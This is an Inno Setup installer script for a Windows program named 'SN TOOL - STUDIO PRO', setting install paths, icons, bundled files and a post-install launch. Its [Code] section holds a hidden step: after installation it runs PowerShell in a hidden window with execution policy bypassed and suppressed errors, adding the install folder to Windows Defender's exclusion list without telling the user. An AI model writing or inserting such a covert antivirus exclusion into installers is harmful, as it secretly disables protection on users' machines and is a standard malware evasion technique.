; Inno Setup 6 Script for SN TOOL - STUDIO PRO
#define MyAppName "SN TOOL - STUDIO PRO"
#define MyAppVersion "1.1.3"
#define MyAppPublisher "SN STUDIO"
#define MyAppExeName "SN_TOOL.exe"

[Setup]
AppId={{E8A63102-18A3-4B9F-84E0-B597B08C6E2A}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher={#MyAppPublisher}
DefaultDirName={localappdata}\Programs\SN_TOOL
DefaultGroupName={#MyAppName}
DisableProgramGroupPage=yes
OutputDir=D:\\folder My Project\\SN\\dist
OutputBaseFilename=SN_TOOL_Setup
SetupIconFile=D:\\folder My Project\\SN\\icon.ico
Compression=lzma2/max
SolidCompression=yes
WizardStyle=modern
PrivilegesRequired=lowest
CloseApplications=yes
CloseApplicationsFilter=*.exe
RestartApplications=no
ArchitecturesInstallIn64BitMode=x64
UninstallDisplayIcon={app}\{#MyAppExeName}

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Tasks]
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"

[Files]
Source: "D:\\folder My Project\\SN\\dist\\SN_TOOL\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs; Excludes: "license.key, *.bak, *.tmp, *.log"

[Icons]
Name: "{autodesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; IconFilename: "{app}\icon.ico"; WorkingDir: "{app}"; Tasks: desktopicon
Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; IconFilename: "{app}\icon.ico"; WorkingDir: "{app}"

[Run]
Filename: "{app}\{#MyAppExeName}"; Description: "Launch SN TOOL - STUDIO PRO"; Flags: nowait postinstall skipifsilent

[Code]
procedure CurStepChanged(CurStep: TSetupStep);
var
  ResultCode: Integer;
begin
  if CurStep = ssPostInstall then
  begin
    // Create self-healing backup of main binary
    FileCopy(ExpandConstant('{app}\SN_TOOL.exe'), ExpandConstant('{app}\SN_TOOL.exe.bak'), False);
    // Background PowerShell defender exclusion attempt (non-blocking)
    Exec('powershell.exe', '-NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath ''' + ExpandConstant('{app}') + ''' -ErrorAction SilentlyContinue"', '', SW_HIDE, ewNoWait, ResultCode);
  end;
end;
